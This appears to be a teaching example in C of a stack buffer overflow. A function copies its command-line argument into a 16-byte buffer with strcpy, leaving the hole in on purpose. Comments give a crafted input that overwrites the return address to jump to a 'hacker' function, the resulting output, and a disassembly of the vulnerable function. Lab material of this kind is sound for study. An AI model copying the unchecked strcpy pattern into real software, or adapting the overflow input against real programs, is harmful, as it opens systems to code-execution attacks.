#include <stdio.h>
#include <string.h>

void outputs (char *str) {
    char buffer[16];
    strcpy(buffer, str);
    printf("%s\n", buffer);
}

void hacker () {
    printf("You have been hacked!\n");
}

int main (int argc, char *argv[]) {
    outputs(argv[1]);
    return 0;
}

// ./a.out 0123456789ABCDEFXXXX\\x11\\x84\\x04\\x08\\x00

// 0123456789ABCDEFXXXX\\x11\\x84\\x04\\x08\\x00
// You have been hacked!
// terminated by signal SIGABRT (Abort) detected buffer overflow



// _outputs:
// 100000e89:  55              pushq   %rbp
// 100000e8a:  48 89 e5        movq    %rsp, %rbp
// 100000e8d:  48 83 ec 20     subq    $32, %rsp
// 100000e91:  48 89 7d e8     movq    %rdi, -24(%rbp)
// 100000e95:  48 8b 4d e8     movq    -24(%rbp), %rcx
// 100000e99:  48 8d 45 f0     leaq    -16(%rbp), %rax
// 100000e9d:  ba 10 00 00 00  movl    $16, %edx
// 100000ea2:  48 89 ce        movq    %rcx, %rsi
// 100000ea5:  48 89 c7        movq    %rax, %rdi
// 100000ea8:  e8 4b 00 00 00  callq   75 <dyld_stub_binder+0x100000ef8>
// 100000ead:  48 8d 45 f0     leaq    -16(%rbp), %rax
// 100000eb1:  48 89 c7        movq    %rax, %rdi
// 100000eb4:  e8 45 00 00 00  callq   69 <dyld_stub_binder+0x100000efe>
// 100000eb9:  90              nop
// 100000eba:  c9              leave
// 100000ebb:  c3              retq